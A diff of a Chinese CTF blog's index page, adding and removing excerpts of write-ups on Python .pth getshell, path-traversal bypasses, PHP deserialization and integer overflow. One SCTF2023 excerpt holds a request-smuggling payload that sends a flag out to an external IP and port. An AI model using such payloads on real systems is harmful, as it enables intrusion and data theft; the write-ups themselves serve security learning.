@@ -110,6 +110,63 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/">Python pth文件写入getshell</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a>&nbsp;<a href="/categories/%E6%9D%82%E6%96%87%E8%AE%B0%E5%BD%95/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>杂文记录</a></span></div><div class="content">原理：Python pth文件写入getshell 参考https://www.cnblogs.com/Nestar/p/17336664.html
+python的site模块支持&quot;Site-specific configuration hook&quot;的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入
+sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为
+D:/Python/temp/ 重新启动python
+1.path的路径被添加到sys.path中
+site.py的实现中，有这么一段
+def addpackage(sitedir, name, known_paths): if known_paths is None: known_paths = _init_pathinfo() reset = True else: reset = False fullname = os.path.join(sitedir, name) _trace(f&#34;Processing .pth file: {fullname!r}&#34;) try: # locale encoding is not ideal especially on Windows. But we have used # it for a long time. setuptools uses the locale encoding too. f = io.TextIOWrapper(io.open_code(fullname), encoding=&#34;locale&#34;) except OSError: return with f: for n, line in enumerate(f): if line.</div><div class="post-footer">
+        <a href="/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">Python</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/python%E6%80%BB%E7%BB%93/">python总结</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">任意文件读取(目录穿越) 2022网鼎杯-web669 例题 直接读取文件、参数可控且过滤不全
+#以下为部分关键代码，其它部分已省略 #............. @app.route(&#39;/&lt;path:file&gt;&#39;, methods=[&#39;GET&#39;]) def download(file): if session.get(&#39;updir&#39;): basedir = session.get(&#39;updir&#39;) try: path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) if os.path.isfile(path): return send_file(path) else: return response(&#34;Not Found.&#34;, 404) except: return response(&#34;Failed.&#34;, 500) #............. 由于对../的处理只是简单使用replace方法进行替换置空，因此使用双写../（&hellip;.//）即可进行绕过
+path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) 然后接下来使用flask的send_file模块读取文件
+if os.path.isfile(path): return send_file(path) 实现了任意文件读取
+使用open打开文件但未close 配合任意文件读取/proc/self/fd
+2020网鼎杯白虎组Web-PicDown app.py源码如下
+from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = &#34;/tmp/secret.</div><div class="post-footer">
+        <a href="/posts/ctf/python%E6%80%BB%E7%BB%93/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">Python</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/sctf2023/">SCTF2023</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">WEB ezcheck1n 这里一直提示time，year不是2023 ，是2022 ，因为下面的post.jpeg
+Apache 版本2.4.54 最近有个请求走私的洞，nssctf 13也出了这个点
+https://xz.aliyun.com/t/12345根据这文章里的脚本修改一下，去拿2022.php外带出$FLAG,
+确实应该这样想/2023/目录是不能变的他题目里的注释里也写了中间件只能转发2023
+/2023/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aUser-Agent:%20curl/7.68.0%0d%0a%0d%0aGET%20/2022.php%3Furl%3D47%2E100%2E196%2E3%3A4444 fumo_backdoor 源码
+&lt;?php error_reporting(0); ini_set(&#39;open_basedir&#39;, __DIR__.&#34;:/tmp&#34;); define(&#34;FUNC_LIST&#34;, get_defined_functions()); class fumo_backdoor { public $path = null; public $argv = null; public $func = null; public $class = null; public function __sleep() { if ( file_exists($this-&gt;path) &amp;&amp; preg_match_all(&#39;/[flag]/m&#39;, $this-&gt;path) === 0 ) { readfile($this-&gt;path); } } public function __wakeup() { $func = $this-&gt;func; if ( is_string($func) &amp;&amp; in_array($func, FUNC_LIST[&#34;internal&#34;]) ) { call_user_func($func); } else { $argv = $this-&gt;argv; $class = $this-&gt;class; new $class($argv); } } } $cmd = $_REQUEST[&#39;cmd&#39;]; $data = $_REQUEST[&#39;data&#39;]; switch ($cmd) { case &#39;unserialze&#39;: unserialize($data); break; case &#39;rm&#39;: system(&#34;rm -rf /tmp 2&gt;/dev/null&#34;); break; default: highlight_file(__FILE__); break; } Sycsever 直接运行给的mian文件</div><div class="post-footer">
+        <a href="/posts/ctf/sctf2023/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/vnctf2023/">VNCTF2023</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web 象棋王子 经典js小游戏
+人性化的签到直接就是jsfuck
+电子木鱼 是一个rust的逻辑利用
+/路由，查看功德数，得这么多才输出flag
+/reset 路由 ，重启
+/upgrade 是个post路由
+可以post传入 上面定义的Payload
+post可以定义这两个参数
+重要的逻辑在这里
+首先name必须是&quot;Donate&quot;或&quot;Cost&quot;
+这两个name的cost分别对应1和10,为正数，所以 GONGDE.set(GONGDE.get() - cost as i32);只会更小
+那么利用cost *= body.quantity; 来使得cost为负数，需要quantity为负数
+由于cost是int32类型变量，这里可以试着溢出，cost是i32，最大值是2147483647，超过这部分会给截断。
+name: Cost的默认cost值是10
+事实上只要 cost * quantity &gt;= int32_max值 即可达到溢出
+传name=Cost&amp;quantity=2047483647，得到flag
+misc 验证码 </div><div class="post-footer">
+        <a href="/posts/ctf/vnctf2023/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/ctf/wmctf-2023/">WMCTF 2023</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">WEB AnyFileRead 看网页以为是SpringSecurity的鉴权绕过嘛，也去跟了下源码
@@ -135,34 +192,6 @@ https://github.com/jas502n/Grafana-CVE-2021-43798获取数据库密码
 secret_key = SW2YcwTIb9zpO1hoPsMm 拿github的工具解密需要go环境</div><div class="post-footer">
         <a href="/posts/ctf/%E5%AD%97%E8%8A%82ctf/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/grafana/">Grafana</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/">强网拟态wp</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web noumisotuitennnoka 本地测一下，确实是，执行了默认的create 、zip 、unzip后
-会在/var/www/html目录下生成jsons文件夹，里面就是backdoor.php 和 .hatccess
-刚开始想通过clean把/var/www/html/jsons/.htaccess 删掉，但是$substr的正则匹配拦住了，绕不过。
-换个思路，通过'remove_path' =&gt; $dev_dir 来清除。
-要满足realpath($dev_dir) == $dir 并且 删除.htaccess
-可以构造dev=/tmp/. 这里是重点，这样就可以在压缩过程中删除.htaccess了。
-所以创建和解压也用/tmp作为目录
-?action=create&amp;subdir=/tmp?action=zip&amp;subdir=/tmp&amp;dev=/tmp/.?action=unzip&amp;subdir=/tmp 解压后就没有.htaccess了
-直接访问backdoor.php</div><div class="post-footer">
-        <a href="/posts/ctf/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">西湖论剑</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web 扭转乾坤 在实际产品场景中常见存在多种中间件的情况，这时如果存在某种拦截，可以利用框架或者中间件对于RFC标准中实现差异进行绕过。注意查看80端口服务
-想先上传试试
-Content-Type不能是 multipart/form-data
-这随便删了个字符就给了flag
-看师傅们都大写绕过,加空格绕过
-Node Magical Login 一个简单的用nodejs写的登录站点（貌似暗藏玄机）
-给了源码
-function LoginController(req,res) { try { const username = req.body.username const password = req.body.password if (username !== &#34;admin&#34; || password !== Math.random().toString()) { res.status(401).type(&#34;text/html&#34;).send(&#34;Login Failed&#34;) } else { res.cookie(&#34;user&#34;,SECRET_COOKIE) res.redirect(&#34;/flag1&#34;) } } catch (__) {} } /flag1的逻辑是要登录admin用户，但是密码是随机数肯定不能正常登录
-function Flag1Controller(req,res){ try { if(req.cookies.user === SECRET_COOKIE){ res.setHeader(&#34;This_Is_The_Flag1&#34;,flag1.toString().trim()) res.setHeader(&#34;This_Is_The_Flag2&#34;,flag2.toString().trim()) res.status(200).type(&#34;text/html&#34;).send(&#34;Login success. Welcome,admin!&#34;) } if(req.cookies.user === &#34;admin&#34;) { res.setHeader(&#34;This_Is_The_Flag1&#34;, flag1.toString().trim()) res.status(200).type(&#34;text/html&#34;).send(&#34;You Got One Part Of Flag!</div><div class="post-footer">
-        <a href="/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -180,6 +209,14 @@ function Flag1Controller(req,res){ try { if(req.cookies.user === SECRET_COOKIE){
                 </li><li class="page-item active">
                     <span class="page-link">
                         <a href="/page/5/">5</a>
+                    </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/6/">6</a>
+                    </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/7/">7</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
